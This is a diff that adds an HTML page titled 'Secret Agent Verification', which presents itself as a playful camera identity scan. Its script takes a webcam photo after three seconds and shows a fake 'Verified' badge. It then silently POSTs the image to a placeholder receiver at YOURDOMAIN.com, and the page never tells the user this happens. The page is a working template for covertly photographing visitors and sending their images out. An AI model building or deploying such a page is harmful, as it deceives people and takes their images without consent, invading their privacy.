@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Agent Scanner</title>
+<style>
+  body { font-family: sans-serif; background: #0b0c10; color: #c5c6c7; text-align: center; padding: 1rem; }
+  h1 { color: #66fcf1; }
+  video, canvas { border-radius: 10px; margin-top: 1rem; max-width: 90vw; }
+  #videoWrapper { position: relative; display: inline-block; }
+  #overlayText { position: absolute; top: 15px; left: 50%; transform: translateX(-50%); font-size: 1.5rem; font-weight: bold; color: #66fcf1; text-shadow: 0 0 5px #45a29e; }
+</style>
+</head>
+<body>
+
+<h1>Secret Agent Verification</h1>
+<p>Smile at the camera! We're scanning your identity...</p>
+
+<div id="videoWrapper">
+  <video id="video" autoplay playsinline width="320" height="240"></video>
+  <div id="overlayText" style="display:none;">✔️ Verified</div>
+</div>
+
+<canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+
+<script>
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const ctx = canvas.getContext('2d');
+const overlayText = document.getElementById('overlayText');
+
+async function startCamera() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+    video.srcObject = stream;
+
+    setTimeout(() => {
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      overlayText.style.display = 'block';
+      video.style.display = 'none';
+      canvas.style.display = 'block';
+
+      const dataURL = canvas.toDataURL('image/png');
+
+      fetch("https://YOURDOMAIN.com/receiver.php", {
+        method: "POST",
+        body: JSON.stringify({ image: dataURL }),
+        headers: { "Content-Type": "application/json" }
+      }).then(res => console.log("Sent!")).catch(err => console.error("Failed", err));
+
+    }, 3000);
+
+  } catch (err) {
+    alert("Camera access denied or unavailable.");
+  }
+}
+
+startCamera();
+</script>
+
+</body>
+</html>
